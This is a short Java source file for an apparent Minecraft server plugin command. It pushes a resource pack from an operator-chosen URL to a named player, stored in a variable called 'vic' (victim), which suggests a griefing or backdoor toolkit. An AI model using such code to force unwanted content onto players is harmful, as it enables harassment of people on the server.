package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class Command_RESOURCEPACK extends CommandBase {

    public Command_RESOURCEPACK() {
        super("resourcepack", "<Spieler> <URL>", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        try {
            if (args.length == 3) {
                Player vic = Bukkit.getPlayer(args[1]);
                String url = args[2];
                ((CraftPlayer) vic).getHandle().playerConnection.sendPacket(new PacketPlayOutResourcePackSend(url, ""));
                p.sendMessage(Start.INSTANCE.chatPrefix + "Spieler muss nun dieses Resourcen-Pack aktzeptieren!");
            }
        } catch (Exception ignored) {
        }
    }

}
